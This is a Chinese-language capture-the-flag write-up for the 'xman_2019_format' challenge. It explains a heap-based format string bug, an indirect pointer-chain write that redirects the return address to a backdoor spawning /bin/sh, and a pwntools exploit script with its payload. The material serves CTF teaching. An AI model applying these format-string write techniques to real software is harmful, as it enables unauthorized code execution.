首先checksec

![image-20210421092017064](https://static.hack1s.fun/images/2021/04/20/image-20210421092017064.png)

main函数里面一层一层的调用，实际上最终就是`read`到堆上的字符串经过了`strtok`之后用`printf`输出

![image-20210421092117824](https://static.hack1s.fun/images/2021/04/20/image-20210421092117824.png)

![image-20210421092053251](https://static.hack1s.fun/images/2021/04/20/image-20210421092053251.png)

关于`strtok(s,delim)`，作用是根据`delim`将`s`切分

```C
#include<string.h>
#include<stdio.h>
int main(void)
{
    char input[16]="abc,d";
    char*p;
    /*strtok places a NULL terminator
    infront of the token,if found*/
    p=strtok(input,",");
    if(p)
        printf("%s\n",p);
        /*Asecond call to strtok using a NULL
        as the first parameter returns a pointer
        to the character following the token*/
    p=strtok(NULL,",");
    if(p)
        printf("%s\n",p);
    return 0;
}
```

第一次调用时input要有内容，返回的值是切分后第一个片段的指针；

第二次调用直接设置input为NULL，就可以返回后面的片段；

![image-20210421092644343](https://static.hack1s.fun/images/2021/04/20/image-20210421092644343.png)

执行一下输入连续的`%p`，可以看到输出的结果没有变化

这是因为实际上是执行了三次printf，每次都是`printf(%p)`，输出了同一个值

这个题目比较独特的地方就是格式化字符串存储在堆上

另外就是只能输入一次，所以也没办法泄漏地址之后交互；

因为格式化字符串在堆上，是没办法像之前一样直接修改、跳转的

这个程序虽然只能输入一次，但是调用格式化字符串时是用循环多次调用了`printf`

所以利用这个分隔符也可以多次执行格式化字符串；



程序里有一个后门函数`0x80485ab`，直接调用`system("/bin/sh")`

所以最终做的方法就是用格式化字符串修改返回地址为这个system函数

非栈上的格式化字符串写需要间接写

![image-20210421191015006](https://static.hack1s.fun/images/2021/04/21/image-20210421191015006.png)

例如我们想要在`0xffdd606c`这个返回地址的地方写入后门函数的地址；

那么首先就需要控制一个指针指向`0xffdd606c`

那么可以首先用格式化字符串控制写`0xffdd6068`的偏移，`%10$n`实际上这样修改的是`0xff6088`处的值，例如可以将其修改为`0xffdd606c`，这样就构造出了这样一个链条

```python
0xffdd6068->0xffdd6088->0xffdd606c->0x804864b
```

这之后我们再利用格式化字符串写`0xffdd6088`的偏移，这样最终就改写了`0xffdd606c`处的返回地址

通过这样的方法修改返回地址为backdoor就可以了

```python
from pwn import *

io = remote('node3.buuoj.cn',29186)
#io = process('./xman_2019_format')
elf = ELF('./xman_2019_format')

backdoor = 0x80485ab
payload = "%108c%10$hhn|%34219c%18$hn"

io.send(payload)

io.interactive()
```

我们这里调试看到的是`6c`，即108，最终要把返回地址的第16位修改为`0x85ab`即34219

但是由于开了随机化，实际上运行过程中`6c`中的`6`是一直在变化的，不过这样多运行几次就可以跑出来

由于取值有16种可能(0-f)，几率大概是`1/16`

